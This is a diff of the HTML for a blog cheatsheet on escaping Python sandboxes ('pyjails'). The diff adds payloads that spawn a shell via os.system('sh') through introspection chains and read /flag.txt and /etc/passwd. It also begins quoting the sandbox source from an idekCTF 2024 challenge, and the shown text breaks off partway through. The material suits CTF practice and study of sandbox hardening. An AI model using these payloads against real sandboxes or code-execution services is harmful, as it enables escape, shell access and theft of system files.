@@ -27,13 +27,13 @@
     <meta http-equiv="content-security-policy" content=""><title>Pyjail Cheatsheet</title><meta property="og:title" content="Pyjail Cheatsheet" data-svelte="svelte-15w3rt">
 	<link href="/_app/immutable/assets/__layout-51aa36ef.css" rel="stylesheet">
 	<link href="/_app/immutable/assets/layout-5b9c754d.css" rel="stylesheet">
-	<link rel="modulepreload" href="/_app/immutable/start-3156b5a7.js">
+	<link rel="modulepreload" href="/_app/immutable/start-49bc5853.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-f2a82808.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-36b86faa.js">
 	<link rel="modulepreload" href="/_app/immutable/pages/__layout.svelte-e154bb9b.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/stores-1686c5b9.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-57d47233.js">
-	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-5d34af56.js">
+	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-83e35489.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/layout-d6e193e1.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/utils-e126d158.js">
   </head>
@@ -148,21 +148,25 @@ license<span class="token punctuation">.</span>_Printer__filenames <span class="
 <span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_builtins_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token string">"_import_"</span><span class="token string">"_('os').system('sh')"</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
 <h3 id="popular-modules"><a href="#popular-modules">popular modules</a></h3>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token comment"># sys</span>
+sys <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"sys"</span><span class="token punctuation">)</span>
+io <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__self__<span class="token punctuation">;</span> sys <span class="token operator">=</span> io<span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"sys"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+builtins <span class="token operator">=</span> <span class="token keyword">print</span><span class="token punctuation">.</span>__self__<span class="token punctuation">;</span> sys <span class="token operator">=</span> builtins<span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>create_module<span class="token punctuation">(</span><span class="token punctuation">[</span>builtins<span class="token punctuation">.</span>__spec__ <span class="token keyword">for</span> builtins<span class="token punctuation">.</span>__spec__<span class="token punctuation">.</span>name <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
 sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"module_name"</span><span class="token punctuation">]</span> <span class="token comment"># contains most of the builtin modules alongside frozen imports (https://docs.python.org/3/library/index.html)</span>
+sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
 sys<span class="token punctuation">.</span>breakpointhook<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># same as breakpoint()</span>
 sys<span class="token punctuation">.</span>_getframe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
 
+<span class="token comment"># _io</span>
+io <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"_io"</span><span class="token punctuation">)</span>
+io <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__self__
+
+io<span class="token punctuation">.</span>FileIO<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>raw<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
 <span class="token comment"># numpy</span>
-numpy<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span> <span class="token comment"># stderr</span>
-
-<span class="token comment"># pandas</span>
-TBA
-
-<span class="token comment"># pickle</span>
-TBA
-
-<span class="token comment"># ast</span>
-TBA</code><!-- HTML_TAG_END --></pre>
+numpy<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span> <span class="token comment"># stderr</span></code><!-- HTML_TAG_END --></pre>
 <h2 id="bypasses-and-payloads"><a href="#bypasses-and-payloads">Bypasses and payloads</a></h2>
 <h3 id="decorators"><a href="#decorators">decorators</a></h3>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token decorator annotation punctuation">@exec</span>
@@ -309,8 +313,12 @@ delete_me <span class="token operator">=</span> <span class="token string">""</s
 <ul class="list"><li><a href="https://rszalski.github.io/magicmethods/#appendix1" rel="noopener" class="text-link" target="_blank">https://rszalski.github.io/magicmethods/#appendix1</a></li></ul>
 <h3 id="stable-payloads"><a href="#stable-payloads">stable payloads</a></h3>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token comment"># @salvatore-abello - type.__subclasses__(type)[0] -> &lt;class 'abc.ABCMeta'></span>
-<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"breakpoint"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
+<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"breakpoint"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># need __import__</span>
+<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># &lt;function __newobj__ at 0x7f0000000000> - need __import__</span>
+<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__reduce_ex__<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__reduce_ex__<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
 <h3 id="finding-sinks-from-modules"><a href="#finding-sinks-from-modules">finding sinks from modules</a></h3>
 <ul class="list"><li><a href="https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code" rel="noopener" class="text-link" target="_blank">https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&amp;type=code</a></li>
 <li><a href="https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code" rel="noopener" class="text-link" target="_blank">https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&amp;type=code</a></li></ul>
@@ -331,6 +339,227 @@ delete_me <span class="token operator">=</span> <span class="token string">""</s
 <li><code>class instances</code>:<ul class="list"><li><code>class cobj:...</code><ul class="list"><li><code>obj = cobj()</code></li></ul></li>
 <li><code>type(&quot;cobj&quot;, (object,), {})()</code><ul class="list"><li><code>[].__class__.__class__(&quot;cobj&quot;, [].__class__.__bases__.__class__([[].__class__.__base__]), {})()</code></li></ul></li></ul></li></ul>
 <h2 id="ctf"><a href="#ctf">CTF</a></h2>
+<h3 id="idekctf-2024-crator"><a href="#idekctf-2024-crator">idekCTF 2024: crator</a></h3>
+<ul class="list"><li><code>sandbox.py</code></li></ul>
+<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py">builtins_whitelist <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>
+    <span class="token punctuation">(</span>
+        <span class="token string">"RuntimeError"</span><span class="token punctuation">,</span>
+        <span class="token string">"Exception"</span><span class="token punctuation">,</span>
+        <span class="token string">"KeyboardInterrupt"</span><span class="token punctuation">,</span>
+        <span class="token string">"False"</span><span class="token punctuation">,</span>
+        <span class="token string">"None"</span><span class="token punctuation">,</span>
+        <span class="token string">"True"</span><span class="token punctuation">,</span>
+        <span class="token string">"bytearray"</span><span class="token punctuation">,</span>
+        <span class="token string">"bytes"</span><span class="token punctuation">,</span>
+        <span class="token string">"dict"</span><span class="token punctuation">,</span>
+        <span class="token string">"float"</span><span class="token punctuation">,</span>
+        <span class="token string">"int"</span><span class="token punctuation">,</span>
+        <span class="token string">"list"</span><span class="token punctuation">,</span>
+        <span class="token string">"object"</span><span class="token punctuation">,</span>
+        <span class="token string">"set"</span><span class="token punctuation">,</span>
+        <span class="token string">"str"</span><span class="token punctuation">,</span>
+        <span class="token string">"tuple"</span><span class="token punctuation">,</span>
+        <span class="token string">"abs"</span><span class="token punctuation">,</span>
+        <span class="token string">"all"</span><span class="token punctuation">,</span>
+        <span class="token string">"any"</span><span class="token punctuation">,</span>
+        <span class="token string">"apply"</span><span class="token punctuation">,</span>
+        <span class="token string">"bin"</span><span class="token punctuation">,</span>
+        <span class="token string">"bool"</span><span class="token punctuation">,</span>
+        <span class="token string">"buffer"</span><span class="token punctuation">,</span>
+        <span class="token string">"callable"</span><span class="token punctuation">,</span>
+        <span class="token string">"chr"</span><span class="token punctuation">,</span>
+        <span class="token string">"classmethod"</span><span class="token punctuation">,</span>
+        <span class="token string">"cmp"</span><span class="token punctuation">,</span>
+        <span class="token string">"coerce"</span><span class="token punctuation">,</span>
+        <span class="token string">"compile"</span><span class="token punctuation">,</span>
+        <span class="token string">"delattr"</span><span class="token punctuation">,</span>
+        <span class="token string">"dir"</span><span class="token punctuation">,</span>
+        <span class="token string">"divmod"</span><span class="token punctuation">,</span>
+        <span class="token string">"enumerate"</span><span class="token punctuation">,</span>
+        <span class="token string">"filter"</span><span class="token punctuation">,</span>
+        <span class="token string">"format"</span><span class="token punctuation">,</span>
+        <span class="token string">"hasattr"</span><span class="token punctuation">,</span>
+        <span class="token string">"hash"</span><span class="token punctuation">,</span>
+        <span class="token string">"hex"</span><span class="token punctuation">,</span>
+        <span class="token string">"id"</span><span class="token punctuation">,</span>
+        <span class="token string">"input"</span><span class="token punctuation">,</span>
+        <span class="token string">"isinstance"</span><span class="token punctuation">,</span>
+        <span class="token string">"issubclass"</span><span class="token punctuation">,</span>
+        <span class="token string">"iter"</span><span class="token punctuation">,</span>
+        <span class="token string">"len"</span><span class="token punctuation">,</span>
+        <span class="token string">"map"</span><span class="token punctuation">,</span>
+        <span class="token string">"max"</span><span class="token punctuation">,</span>
+        <span class="token string">"min"</span><span class="token punctuation">,</span>
+        <span class="token string">"next"</span><span class="token punctuation">,</span>
+        <span class="token string">"oct"</span><span class="token punctuation">,</span>
+        <span class="token string">"open"</span><span class="token punctuation">,</span>
+        <span class="token string">"ord"</span><span class="token punctuation">,</span>
+        <span class="token string">"pow"</span><span class="token punctuation">,</span>
+        <span class="token string">"print"</span><span class="token punctuation">,</span>
+        <span class="token string">"property"</span><span class="token punctuation">,</span>
+        <span class="token string">"range"</span><span class="token punctuation">,</span>
+        <span class="token string">"reduce"</span><span class="token punctuation">,</span>
+        <span class="token string">"repr"</span><span class="token punctuation">,</span>
+        <span class="token string">"reversed"</span><span class="token punctuation">,</span>
+        <span class="token string">"round"</span><span class="token punctuation">,</span>
+        <span class="token string">"setattr"</span><span class="token punctuation">,</span>
+        <span class="token string">"slice"</span><span class="token punctuation">,</span>
+        <span class="token string">"sorted"</span><span class="token punctuation">,</span>
+        <span class="token string">"staticmethod"</span><span class="token punctuation">,</span>
+        <span class="token string">"sum"</span><span class="token punctuation">,</span>
+        <span class="token string">"super"</span><span class="token punctuation">,</span>
+        <span class="token string">"unichr"</span><span class="token punctuation">,</span>
+        <span class="token string">"xrange"</span><span class="token punctuation">,</span>
+        <span class="token string">"zip"</span><span class="token punctuation">,</span>
+        <span class="token string">"len"</span><span class="token punctuation">,</span>
+        <span class="token string">"sort"</span><span class="token punctuation">,</span>
+    <span class="token punctuation">)</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">class</span> <span class="token class-name">ReadOnlyBuiltins</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
+    <span class="token keyword">def</span> <span class="token function">__delitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
+    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
+    <span class="token keyword">def</span> <span class="token function">popitem</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
+    <span class="token keyword">def</span> <span class="token function">setdefault</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
+    <span class="token keyword">def</span> <span class="token function">__setitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
+    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">,</span> <span class="token operator">**</span>kw<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">_safe_open</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">,</span> submission_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">safe_open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> mode <span class="token operator">!=</span> <span class="token string">"r"</span><span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
+        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>submission_id <span class="token operator">+</span> <span class="token string">".expected"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> safe_open
+
+<span class="token keyword">class</span> <span class="token class-name">Sandbox</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> submission_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">import</span> sys
+        <span class="token keyword">from</span> ctypes <span class="token keyword">import</span> pythonapi<span class="token punctuation">,</span> POINTER<span class="token punctuation">,</span> py_object
+
+        _get_dict <span class="token operator">=</span> pythonapi<span class="token punctuation">.</span>_PyObject_GetDictPtr
+        _get_dict<span class="token punctuation">.</span>restype <span class="token operator">=</span> POINTER<span class="token punctuation">(</span>py_object<span class="token punctuation">)</span>
+        _get_dict<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> <span class="token punctuation">[</span>py_object<span class="token punctuation">]</span>
+        <span class="token keyword">del</span> pythonapi<span class="token punctuation">,</span> POINTER<span class="token punctuation">,</span> py_object
+
+        <span class="token keyword">def</span> <span class="token function">dictionary_of</span><span class="token punctuation">(</span>ob<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            dptr <span class="token operator">=</span> _get_dict<span class="token punctuation">(</span>ob<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> dptr<span class="token punctuation">.</span>contents<span class="token punctuation">.</span>value
+        type_dict <span class="token operator">=</span> dictionary_of<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span>
+        <span class="token keyword">del</span> type_dict<span class="token punctuation">[</span><span class="token string">"__bases__"</span><span class="token punctuation">]</span>
+        <span class="token keyword">del</span> type_dict<span class="token punctuation">[</span><span class="token string">"__subclasses__"</span><span class="token punctuation">]</span>
+        original_builtins <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__
+        original_builtins<span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span> <span class="token operator">=</span> _safe_open<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">,</span> submission_id<span class="token punctuation">)</span>
+        <span class="token keyword">for</span> builtin <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>original_builtins<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> builtin <span class="token keyword">not</span> <span class="token keyword">in</span> builtins_whitelist<span class="token punctuation">:</span>
+                <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>builtin<span class="token punctuation">]</span>
+        safe_builtins <span class="token operator">=</span> ReadOnlyBuiltins<span class="token punctuation">(</span>original_builtins<span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span> <span class="token operator">=</span> safe_builtins
+        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__file__
+        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"__loader__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__loader__
+        <span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token punctuation">[</span>
+            <span class="token string">"__loader__"</span><span class="token punctuation">,</span>
+            <span class="token string">"__spec__"</span><span class="token punctuation">,</span>
+            <span class="token string">"origin"</span><span class="token punctuation">,</span>
+            <span class="token string">"__file__"</span><span class="token punctuation">,</span>
+            <span class="token string">"__cached__"</span><span class="token punctuation">,</span>
+            <span class="token string">"ReadOnlyBuiltins"</span><span class="token punctuation">,</span>
+            <span class="token string">"Sandbox"</span><span class="token punctuation">,</span>
+        <span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> key <span class="token keyword">in</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">:</span>
+                <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>key<span class="token punctuation">]</span></code><!-- HTML_TAG_END --></pre>
+<ul class="list"><li><code>chall.py</code></li></ul>
+<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/submit/&lt;problem_id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@login_required</span>
+<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>problem_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">32768</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token comment"># Prepare code</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.py'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__import__("sandbox").Sandbox("</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">")&#92;n'</span></span> <span class="token operator">+</span> code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&#92;r&#92;n'</span><span class="token punctuation">,</span> <span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token comment"># Set up input and output files</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.in'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>testcase<span class="token punctuation">.</span><span class="token builtin">input</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&#92;r&#92;n'</span><span class="token punctuation">,</span> <span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
